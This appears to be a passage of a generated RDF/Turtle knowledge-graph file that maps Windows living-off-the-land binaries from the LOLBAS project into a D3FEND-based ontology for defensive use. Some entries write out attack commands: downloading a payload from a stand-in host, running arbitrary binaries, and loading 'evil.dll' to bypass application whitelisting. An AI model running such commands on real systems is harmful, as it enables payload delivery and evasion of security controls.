<https://w3id.org/mknd/data/lolbas> a owl:Ontology ;
    dcterms:creator <https://orcid.org/0000-0001-7399-6740> ;
    dcterms:date "2022-12-29"^^xsd:date ;
    dcterms:description "Windows living-off-the-land binaries, scripts and libraries from the LOLBAS project (https://lolbas-project.github.io), as MKND/D3FEND individuals."@en ;
    dcterms:license <https://opensource.org/license/mit> ;
    dcterms:modified "2026-10-29"^^xsd:date ;
    dcterms:source <https://github.com/LOLBAS-Project/LOLBAS/tree/ded90467a86850b64f86ccfeae5595056a4b8eb2> ;
    dcterms:title "LOLBAS dataset for MKND"@en ;
    rdfs:comment "Generated by scripts/data/generate.py (`make data`) from LOLBAS-Project/LOLBAS at commit ded90467a86850b64f86ccfeae5595056a4b8eb2 (2022-12-29); dcterms:date is that commit's date. Do not edit by hand."@en ;
    owl:imports mknd: ;
    owl:versionIRI <https://w3id.org/mknd/data/lolbas/0.5.0> ;
    owl:versionInfo "0.5.0" .

mknd:command_DefaultPack.EXE%20%2FC%3A%22process.exe%20args%22 a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "DefaultPack.EXE /C:\"process.exe args\"" ;
    d3f:created-by mknd:ingestion_log_lolbas ;
    d3f:description "Use DefaultPack.EXE to execute arbitrary binaries, with added argument support." ;
    d3f:enables mknd:technique_T1218 ;
    d3f:uses mknd:executable_DefaultPack.EXE ;
    mknd:extCategory "Execute" ;
    mknd:id "DefaultPack.EXE /C:\"process.exe args\"" ;
    mknd:operating-system "Windows" ;
    mknd:required-privileges "User" ;
    mknd:use-case "Can be used to execute stagers, binaries, and other malicious commands." ;
    mknd:value "DefaultPack.EXE /C:\"process.exe args\"" .

mknd:command_Ldifde%20-i%20-f%20inputfile.ldf a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "Ldifde -i -f inputfile.ldf" ;
    d3f:created-by mknd:ingestion_log_lolbas ;
    d3f:description "Import inputfile.ldf into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt, the file will be downloaded into IE temp folder." ;
    d3f:enables mknd:technique_T1105 ;
    d3f:uses mknd:executable_Ldifde.exe ;
    mknd:extCategory "Download" ;
    mknd:id "Ldifde -i -f inputfile.ldf" ;
    mknd:operating-system "Windows Server with AD Domain Services role,  Windows 10 with AD LDS role." ;
    mknd:required-privileges "Administrator" ;
    mknd:use-case "Download file from Internet" ;
    mknd:value "Ldifde -i -f inputfile.ldf" .

mknd:command_ProtocolHandler.exe%20https%3A%2F%2Fexample.com%2Fpayload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ProtocolHandler.exe https://example.com/payload" ;
    d3f:created-by mknd:ingestion_log_lolbas ;
    d3f:description "Downloads payload from remote server" ;
    d3f:enables mknd:technique_T1105 ;
    d3f:uses mknd:executable_ProtocolHandler.exe ;
    mknd:extCategory "Download" ;
    mknd:id "ProtocolHandler.exe https://example.com/payload" ;
    mknd:operating-system "Windows 10, Windows 11" ;
    mknd:required-privileges "User" ;
    mknd:use-case "It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE)" ;
    mknd:value "ProtocolHandler.exe https://example.com/payload" .

mknd:command_coregen.exe%20%2FL%20C%3A%5Cfolder%5Cevil.dll%20dummy_assembly_name a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name" ;
    d3f:created-by mknd:ingestion_log_lolbas ;
    d3f:description "Loads the target .DLL in arbitrary path specified with /L.",
        "Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions." ;
    d3f:enables mknd:technique_T1055,
        mknd:technique_T1218 ;
    d3f:uses mknd:executable_coregen.exe ;
    mknd:extCategory "AWL Bypass",
        "Execute" ;
    mknd:id "coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name" ;
    mknd:operating-system "Windows" ;
    mknd:required-privileges "User" ;
    mknd:use-case "Execute DLL code" ;
    mknd:value "coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name" .

mknd:command_coregen.exe%20dummy_assembly_name a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "coregen.exe dummy_assembly_name" ;
    d3f:created-by mknd:ingestion_log_lolbas ;
